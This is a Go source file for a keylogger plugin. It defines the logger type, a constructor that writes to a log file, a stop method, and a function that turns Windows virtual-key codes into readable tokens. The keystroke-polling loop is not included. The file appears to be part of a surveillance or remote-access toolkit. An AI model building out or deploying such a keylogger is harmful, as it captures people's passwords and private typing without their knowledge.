package plugins

import (
	"fmt"
	"strings"
)

// VK codes relevant to the logger.
const (
	vkBackspace = 0x08
	vkTab       = 0x09
	vkEnter     = 0x0D
	vkShift     = 0x10
	vkSpace     = 0x20
)

// Keylogger polls keyboard state and appends key tokens to a log file.
// The polling loop itself is platform-specific (Start); the shared
// parts live here so the mapping is testable without a Windows build.
type Keylogger struct {
	logFile string
	stop    chan struct{}
	active  bool
	down    map[int]bool
}

// NewKeylogger writes to the given log file path.
func NewKeylogger(logFile string) *Keylogger {
	return &Keylogger{logFile: logFile, stop: make(chan struct{}), down: make(map[int]bool)}
}

// Stop ends the polling loop.
func (k *Keylogger) Stop() {
	select {
	case <-k.stop:
	default:
		close(k.stop)
	}
}

// KeyName renders a Windows virtual-key code as a human readable token.
// Printable ASCII comes back as its character; special keys use
// [NAME] notation.
func KeyName(vk int, shifted bool) string {
	switch {
	case vk == vkBackspace:
		return "[BACKSPACE]"
	case vk == vkTab:
		return "[TAB]"
	case vk == vkEnter:
		return "[ENTER]\n"
	case vk == vkSpace:
		return " "
	case vk >= 0x30 && vk <= 0x39: // digits / symbols row
		if shifted {
			return string(")!@#$%^&*("[vk-0x30])
		}
		return string(rune(vk))
	case vk >= 0x41 && vk <= 0x5A: // A-Z
		if shifted {
			return string(rune(vk))
		}
		return strings.ToLower(string(rune(vk)))
	case vk >= 0x60 && vk <= 0x69: // numpad 0-9
		return fmt.Sprintf("[NUMPAD%d]", vk-0x60)
	case vk == 0x6A:
		return "*"
	case vk == 0x6B:
		return "+"
	case vk == 0x6D:
		return "-"
	case vk == 0x6E:
		return "."
	case vk == 0x6F:
		return "/"
	case vk >= 0x70 && vk <= 0x87: // F1-F24
		return fmt.Sprintf("[F%d]", vk-0x70+1)
	default:
		return fmt.Sprintf("[%02X]", vk)
	}
}
